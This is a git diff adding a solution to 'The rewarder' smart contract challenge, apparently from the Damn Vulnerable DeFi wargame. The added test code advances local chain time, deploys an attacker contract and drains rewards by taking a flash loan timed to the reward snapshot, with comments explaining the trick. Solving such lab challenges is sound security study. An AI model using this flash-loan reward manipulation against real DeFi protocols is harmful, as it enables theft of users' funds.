@@ -68,6 +68,37 @@ describe('[Challenge] The rewarder', function () {
         /** YOUR EXPLOIT GOES HERE */
         const accounts = await ethers.getSigners();
         const attacker = accounts[5];
+
+        /* 
+         * We need to catch the start of the round to pass "isNewRewardsRound" check and 
+         * trigger "_recordSnapshot". So that we can both collect the reward and 
+         * return the flashloan back in a single transaction.
+         *
+         * Challenge also says that "Users should not get more rewards this round"
+         * This is achivied with our huge reward but it was unexpected to me. I thought
+         * users would get a small amount of reward however they didn't. I suppose this
+         * is related to decimal round precision of solidity. Need to experiment on this later.
+         */
+        const duration = 60 * 60 * 24 * 5;
+        await network.provider.send("evm_increaseTime", [duration]);
+
+        const expFactory = await ethers.getContractFactory("TheRewarderExp");
+        const expCont = await expFactory.connect(attacker).deploy(
+            this.flashLoanPool.address,
+            this.rewarderPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address,
+        );
+        
+        let loanAmount = await this.liquidityToken.balanceOf(this.flashLoanPool.address);
+        console.log(loanAmount);
+        let tx = await expCont.attack(loanAmount);
+        await tx.wait();
+        console.log(tx);
+
+        tx = await expCont.withdraw();
+        await tx.wait();
+        console.log(tx);
     });
 
     after(async function () {
